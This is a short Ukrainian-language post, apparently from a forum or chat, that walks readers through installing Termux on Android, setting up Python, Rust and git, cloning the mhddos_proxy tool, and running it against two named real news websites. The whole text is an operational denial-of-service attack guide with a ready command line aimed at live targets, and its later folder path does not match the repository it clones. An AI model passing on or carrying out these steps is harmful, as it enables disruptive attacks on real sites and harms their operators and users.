Термукс це по cуті Linux для Android

Спробуйте ось так:
Установка:
https://github.com/termux/termux-app/releases/download/v0.118.0/termux-app_v0.118.0+github-debug_universal.apk

apt update && apt upgrade -y

pkg install python -y && pkg install rust -y && pkg install git -y

pip install --upgrade pip

Тут специфічно в залежності від архітектури процесора. Але виставив вам скажемо так пріоритет, якщо ви не знаєте яка у
вас архітектура то пробуйте встановлювати цю зміну перебираючи мій пріоритет до поки встановлення не буде успішним.

Пріоритети:

aarch64-linux-android

arm-linux-androideabi

armv7-linux-androideabi

i686-linux-android

thumbv7neon-linux-androideabi

x86_64-linux-android

export CARGO_BUILD_TARGET={архітектура процесора}

На моєму пристрої команда виглядає так:

export CARGO_BUILD_TARGET=aarch64-linux-android

termux-setup-storage

cd storage/shared

git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git

cd mhddos_proxy

pip install -r requirements.txt

python runner.py https://ria.ru https://tass.ru

Готово тепер після повного закриття термукса щоб попасти в папку з MHDDOS вам потрібно ввести.

cd storage/shared/MHDDoS

Інструкція не моя, тому сам не тестував, за основу взяв ось
це: https://telegra.ph/Vstanovlennya-Termux-ta-MHDDOS-na-nogo--Android-70-120-03-14
